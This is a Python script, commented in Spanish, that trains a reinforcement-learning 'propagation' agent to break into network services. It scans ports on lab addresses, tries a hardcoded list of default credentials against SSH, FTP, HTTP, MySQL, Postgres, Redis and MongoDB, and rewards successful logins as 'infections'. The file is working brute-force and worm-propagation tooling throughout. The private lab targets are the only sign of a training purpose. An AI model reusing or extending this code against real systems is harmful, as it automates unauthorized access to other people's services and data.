#!/usr/bin/env python3
"""
Advanced DQN Training - Real Exploitation & Learning
Versión mejorada con explotación real y aprendizaje de patrones
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from config import Config
except ImportError:
    from configs.config import Config

import numpy as np
import random
import socket
import time
import json
import threading
from rl_engine import PropagationAgent, NetworkEnvironment


class CredentialLearner:
    """
    Aprende qué credenciales funcionan mejor en cada servicio
    """
    def __init__(self):
        self.port_creds_success = {}  # port -> {credential: success_rate}
        self.port_creds_attempts = {}  # port -> {credential: attempts}
        
    def record_attempt(self, port, username, password, success):
        if port not in self.port_creds_success:
            self.port_creds_success[port] = {}
            self.port_creds_attempts[port] = {}
        
        key = f"{username}:{password}"
        if key not in self.port_creds_attempts[port]:
            self.port_creds_attempts[port][key] = 0
            self.port_creds_success[port][key] = 0
        
        self.port_creds_attempts[port][key] += 1
        if success:
            self.port_creds_success[port][key] += 1
    
    def get_best_creds(self, port):
        if port not in self.port_creds_success:
            return None
        
        best = None
        best_rate = -1
        for cred, successes in self.port_creds_success[port].items():
            attempts = self.port_creds_attempts[port][cred]
            if attempts >= 2:  # Mínimo 2 intentos
                rate = successes / attempts
                if rate > best_rate:
                    best_rate = rate
                    best = cred
        return best
    
    def get_stats(self):
        return {
            'ports_learned': len(self.port_creds_success),
            'credentials_learned': sum(len(v) for v in self.port_creds_success.values())
        }


class RealExploiter:
    """
    Real exploitation attempts with actual service connections
    """
    
    def __init__(self):
        self.credentials_db = [
            ('admin', 'admin'),
            ('admin', 'admin123'),
            ('admin', 'password'),
            ('root', 'root'),
            ('root', 'toor'),
            ('root', '123456'),
            ('root', 'password'),
            ('test', 'test'),
            ('test', '123456'),
            ('jenkins', 'jenkins'),
            ('mysql', 'mysql'),
            ('postgres', 'postgres'),
            ('redis', 'redis'),
            ('ubuntu', 'ubuntu'),
        ]
        
        self.service_handlers = {
            21: self._test_ftp,
            80: self._test_http,
            443: self._test_https,
            3306: self._test_mysql,
            5432: self._test_postgres,
            6379: self._test_redis,
            8080: self._test_http_alt,
            8081: self._test_http_alt,
            27017: self._test_mongo,
            9200: self._test_elastic,
        }
    
    def _test_ssh(self, ip, username, password):
        """Test SSH connection"""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password, timeout=2)
            client.close()
            return True
        except Exception:
            return False
    
    def _test_ftp(self, ip, username, password):
        """Test FTP connection"""
        try:
            import ftplib
            ftp = ftplib.FTP(ip, timeout=2)
            ftp.login(username, password)
            ftp.quit()
            return True
        except Exception:
            return False
    
    def _test_http(self, ip, username, password):
        """Test HTTP basic auth"""
        try:
            import requests
            from requests.auth import HTTPBasicAuth
            r = requests.get(f"http://{ip}/", auth=HTTPBasicAuth(username, password), timeout=3)
            return r.status_code == 200
        except:
            return False
    
    def _test_https(self, ip, username, password):
        """Test HTTPS basic auth"""
        try:
            import requests
            from requests.auth import HTTPBasicAuth
            r = requests.get(f"https://{ip}/", auth=HTTPBasicAuth(username, password), timeout=3, verify=False)
            return r.status_code == 200
        except:
            return False
    
    def _test_mysql(self, ip, username, password):
        """Test MySQL connection"""
        try:
            import pymysql
            conn = pymysql.connect(host=ip, user=username, password=password, connect_timeout=3)
            conn.close()
            return True
        except:
            return False
    
    def _test_postgres(self, ip, username, password):
        """Test PostgreSQL connection"""
        try:
            import psycopg2
            conn = psycopg2.connect(host=ip, user=username, password=password, connect_timeout=3)
            conn.close()
            return True
        except:
            return False
    
    def _test_redis(self, ip, username, password):
        """Test Redis connection"""
        try:
            import redis
            r = redis.Redis(host=ip, password=password if password else None, socket_timeout=3)
            r.ping()
            return True
        except:
            return False
    
    def _test_http_alt(self, ip, username, password):
        """Test HTTP on alternate port"""
        return self._test_http(ip, username, password)
    
    def _test_mongo(self, ip, username, password):
        """Test MongoDB connection"""
        try:
            from pymongo import MongoClient
            if username and password:
                uri = f"mongodb://{username}:{password}@{ip}:27017/"
            else:
                uri = f"mongodb://{ip}:27017/"
            client = MongoClient(uri, serverSelectionTimeoutMS=3000)
            client.server_info()
            client.close()
            return True
        except:
            return False
    
    def _test_elastic(self, ip, username, password):
        """Test Elasticsearch"""
        try:
            import requests
            r = requests.get(f"http://{ip}:9200/", timeout=3)
            return r.status_code in [200, 401]
        except:
            return False
    
    def try_exploit(self, ip, port, username, password):
        """Try real exploitation on service"""
        if port in self.service_handlers:
            try:
                return self.service_handlers[port](ip, username, password)
            except Exception as e:
                return False
        
        return False
    
    def generate_creds(self):
        """Generate credential combinations"""
        return self.credentials_db.copy()


class AdvancedDQNTrainer:
    """
    Trainer avanzado con aprendizaje real y escenarios complejos
    """
    
    def __init__(self, state_size=30, action_size=20, episodes_per_lab=20):
        self.state_size = state_size
        self.action_size = action_size
        self.episodes_per_lab = episodes_per_lab
        
        # Agente DQN
        self.agent = PropagationAgent(state_size, action_size, use_dqn=True)
        
        # Labs avanzados
        self.labs = {
            0: {'ip': '192.168.200.10', 'name': 'Web', 'ports': [80, 443]},
            1: {'ip': '192.168.200.11', 'name': 'SSH', 'ports': [22, 21]},
            2: {'ip': '192.168.200.12', 'name': 'MySQL', 'ports': [3306]},
            3: {'ip': '192.168.200.13', 'name': 'Postgres', 'ports': [5432]},
            4: {'ip': '192.168.200.14', 'name': 'Redis', 'ports': [6379]},
            5: {'ip': '192.168.200.15', 'name': 'Jenkins', 'ports': [8080]},
            6: {'ip': '192.168.200.16', 'name': 'Nexus', 'ports': [8081]},
            7: {'ip': '192.168.200.17', 'name': 'MongoDB', 'ports': [27017]},
        }
        
        # Sistemas de aprendizaje
        self.credential_learner = CredentialLearner()
        self.exploiter = RealExploiter()
        
        # Historial
        self.history = {
            'episodes': [],
            'rewards': [],
            'epsilon': [],
            'infections': [],
            'real_successes': [],
            'credential_stats': [],
        }
        
        self.available_labs = []
        self.best_reward = float('-inf')
        
        # Parámetros de entrenamiento mejorados
        self.agent.epsilon = 1.0
        self.agent.epsilon_min = 0.001
        self.agent.epsilon_decay = 0.98  # Más lento para más exploración
    
    def check_port(self, ip, port, timeout=2):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_target_comprehensive(self, ip):
        """Comprehensive port scan"""
        ports_found = []
        ports_to_scan = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 
                        5432, 5900, 6379, 8080, 8081, 8443, 9200, 27017]
        
        for port in ports_to_scan:
            if self.check_port(ip, port):
                ports_found.append(port)
        
        return ports_found
    
    def create_state(self, open_ports, lab_id, attempt_num, success_history):
        """Create enhanced state vector"""
        state = np.zeros(self.state_size)
        
        # Puertos abiertos (one-hot encoding)
        all_ports = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 8081, 27017]
        for i, port in enumerate(all_ports):
            if port in open_ports:
                state[i] = 1.0
        
        # Lab ID encoding
        if lab_id < 10:
            state[10 + lab_id] = 1.0
        
        # Attempt number
        state[20] = attempt_num / 20.0
        
        # Historial de éxitos recientes
        for i, success in enumerate(success_history[-5:]):
            state[21 + i] = success
        
        # Puerto más reciente exitoso
        if success_history:
            state[26] = success_history[-1] / 30000.0 if success_history[-1] > 0 else 0
        
        # Estado de exploración (epsilon)
        state[27] = self.agent.epsilon
        
        # Time of day (cyclic)
        state[28] = (time.time() % 86400) / 86400.0
        
        return state.tolist()
    
    def get_reward(self, infection_success, open_ports, attempts, success_pattern):
        """Calculate sophisticated reward"""
        reward = 0
        
        if infection_success:
            reward += 100.0
            # Bonus por usar credenciales aprendidas
            if success_pattern:
                reward += 20.0
        
        # Penalty por muchos intentos fallidos
        if attempts > 5:
            reward -= 20.0
        
        # Penalty si no hay puertos
        if not open_ports:
            reward -= 10.0
        
        # Bonus por eficiencia (menos intentos = más bonus)
        if infection_success and attempts <= 2:
            reward += 30.0
        
        return reward
    
    def check_available_labs(self):
        """Check which labs are available"""
        print("\n" + "="*60)
        print("  ESCANEANDO LABORATORIOS DISPONIBLES")
        print("="*60)
        
        self.available_labs = []
        
        for lab_id, lab in self.labs.items():
            open_ports = self.scan_target_comprehensive(lab['ip'])
            if open_ports:
                self.available_labs.append(lab_id)
                print(f"  ✓ Lab {lab_id}: {lab['name']:<10} @ {lab['ip']} → Puertos: {open_ports}")
            else:
                print(f"  ✗ Lab {lab_id}: {lab['name']:<10} @ {lab['ip']} → NO ACCESIBLE")
        
        print(f"\n  Labs disponibles: {len(self.available_labs)}")
        
        return self.available_labs
    
    def train_on_lab(self, lab_id, episodes=None):
        """Train on specific lab with real exploitation"""
        if episodes is None:
            episodes = self.episodes_per_lab
            
        lab = self.labs[lab_id]
        
        print(f"\n{'='*60}")
        print(f"  LAB {lab_id}: {lab['name']} ({lab['ip']})")
        print(f"  Episodios: {episodes} | Epsilon: {self.agent.epsilon:.4f}")
        print(f"{'='*60}")
        
        lab_rewards = []
        lab_infections = 0
        lab_real_successes = 0
        
        # Historial de éxitos por lab
        lab_success_history = []
        
        for episode in range(episodes):
            print(f"\n  Episode {episode+1}/{episodes}")
            
            # Scan real
            open_ports = self.scan_target_comprehensive(lab['ip'])
            
            if not open_ports:
                print(f"    ⚠ No hay puertos abiertos")
                continue
            
            print(f"    Puertos abiertos: {open_ports}")
            
            # Get best known credentials for this lab
            best_known_creds = []
            for port in open_ports:
                best = self.credential_learner.get_best_creds(port)
                if best:
                    user, pwd = best.split(':')
                    best_known_creds.append((port, user, pwd))
            
            # Create state
            state = self.create_state(open_ports, lab_id, episode, lab_success_history)
            
            episode_reward = 0
            attempts = 0
            infected = False
            max_attempts = min(8, len(open_ports) * 3)  # Más intentos para aprender
            
            # Get all credentials to try
            all_creds = self.exploiter.generate_creds()
            
            # Add best known credentials first
            if best_known_creds:
                prioritized_creds = best_known_creds + [(port, user, pwd) for port in open_ports for user, pwd in all_creds if (port, user, pwd) not in best_known_creds]
            else:
                prioritized_creds = [(port, user, pwd) for port in open_ports for user, pwd in all_creds]
            
            while attempts < max_attempts and not infected:
                # Agent chooses action
                action_idx = self.agent.act(state, list(range(len(prioritized_creds))))
                
                # Get action (port, username, password)
                if action_idx < len(prioritized_creds):
                    port, username, password = prioritized_creds[action_idx]
                else:
                    port = random.choice(open_ports)
                    username, password = random.choice(all_creds)
                
                # Try REAL exploitation
                success = self.exploiter.try_exploit(lab['ip'], port, username, password)
                
                # Record for learning
                self.credential_learner.record_attempt(port, username, password, success)
                
                if success:
                    infected = True
                    lab_real_successes += 1
                    lab_infections += 1
                    lab_success_history.append(port)
                    print(f"    ✓ EXITO REAL! Puerto {port} con {username}:{password}")
                
                # Calculate reward
                reward = self.get_reward(infected, open_ports, attempts, success and attempts < 3)
                episode_reward += reward
                
                # Store experience
                next_state = self.create_state(open_ports, lab_id, episode + 1, lab_success_history)
                done = infected or attempts >= max_attempts - 1
                
                self.agent.remember(state, action_idx, reward, next_state, done)
                
                # Replay
                if len(self.agent.memory) >= 32:
                    self.agent.replay(batch_size=32)
                
                state = next_state
                attempts += 1
            
            # Decay epsilon
            if self.agent.epsilon > self.agent.epsilon_min:
                self.agent.epsilon *= self.agent.epsilon_decay
            
            lab_rewards.append(episode_reward)
            self.history['rewards'].append(episode_reward)
            self.history['epsilon'].append(self.agent.epsilon)
            self.history['infections'].append(lab_infections)
            self.history['real_successes'].append(lab_real_successes)
            self.history['credential_stats'].append(self.credential_learner.get_stats())
            self.history['episodes'].append(len(self.history['episodes']) + 1)
            
            # Save best model
            if episode_reward > self.best_reward:
                self.best_reward = episode_reward
                if self.agent.q_network is not None:
                    os.makedirs("models", exist_ok=True)
                    self.agent.save("models/best_dqn_model.pt")
            
            print(f"    Reward: {episode_reward:.1f} | Infecciones: {lab_infections} | Exitos reales: {lab_real_successes}")
        
        avg_reward = sum(lab_rewards) / len(lab_rewards) if lab_rewards else 0
        print(f"\n  📊 Lab {lab_id} Summary:")
        print(f"     Infecciones: {lab_infections}")
        print(f"     Exitos reales: {lab_real_successes}")
        print(f"     Reward promedio: {avg_reward:.1f}")
        
        return lab_infections, lab_real_successes, avg_reward
    
    def train(self, total_episodes=200, num_rounds=15):
        """Main training loop - más rounds y más episodios"""
        print("="*70)
        print("  ADVANCED DQN TRAINING - REAL EXPLOITATION")
        print(f"  Rounds: {num_rounds} | Episodios por lab: {total_episodes // 8}")
        print("="*70)
        
        # Check labs
        self.check_available_labs()
        
        if not self.available_labs:
            print("\n⚠️ No hay labs disponibles!")
            return self.history
        
        episodes_per_lab = max(15, total_episodes // len(self.available_labs))
        
        # Training loops
        for round_num in range(num_rounds):
            print(f"\n{'='*70}")
            print(f"  ROUND {round_num + 1}/{num_rounds}")
            print(f"  Epsilon: {self.agent.epsilon:.4f} | Best Reward: {self.best_reward:.1f}")
            print(f"{'='*70}")
            
            # Shuffle labs for variety
            random.shuffle(self.available_labs)
            
            for lab_id in self.available_labs:
                self.train_on_lab(lab_id, episodes_per_lab)
                self.agent.update_target_model()
            
            # Save checkpoint
            if self.agent.q_network is not None:
                os.makedirs("models", exist_ok=True)
                self.agent.save(f"models/checkpoint_advanced_round_{round_num+1}.pt")
            
            # Report
            cred_stats = self.credential_learner.get_stats()
            print(f"\n  📈 Progress Round {round_num+1}:")
            print(f"     Total Episodes: {len(self.history['rewards'])}")
            print(f"     Total Infections: {self.history['infections'][-1] if self.history['infections'] else 0}")
            print(f"     Real Successes: {self.history['real_successes'][-1] if self.history['real_successes'] else 0}")
            print(f"     Credentials Learned: {cred_stats['credentials_learned']}")
            print(f"     Epsilon: {self.agent.epsilon:.4f}")
        
        # Final summary
        print("\n" + "="*70)
        print("  TRAINING COMPLETE - ADVANCED DQN")
        print("="*70)
        print(f"  Total Episodes: {len(self.history['rewards'])}")
        print(f"  Total Infections: {self.history['infections'][-1] if self.history['infections'] else 0}")
        print(f"  Real Successes: {self.history['real_successes'][-1] if self.history['real_successes'] else 0}")
        print(f"  Final Epsilon: {self.agent.epsilon:.4f}")
        print(f"  Best Reward: {self.best_reward:.1f}")
        print(f"  Credentials Learned: {self.credential_learner.get_stats()}")
        
        # Save final model
        if self.agent.q_network is not None:
            self.agent.save("models/advanced_dqn_model.pt")
        
        # Save history
        with open("training_history_advanced.json", 'w') as f:
            json.dump(self.history, f, indent=2)
        
        return self.history


def main():
    print("="*70)
    print("  ADVANCED DQN TRAINING WITH REAL EXPLOITATION")
    print("  Aprendizaje de credenciales + Explotación real")
    print("="*70)
    
    trainer = AdvancedDQNTrainer(
        state_size=30,
        action_size=20,
        episodes_per_lab=20
    )
    
    # Longer training: 15 rounds, 200 episodes total
    history = trainer.train(total_episodes=200, num_rounds=15)
    
    print("\n✅ Advanced Training Complete!")
    print("Models saved to: models/")
    print("History saved to: training_history_advanced.json")


if __name__ == "__main__":
    main()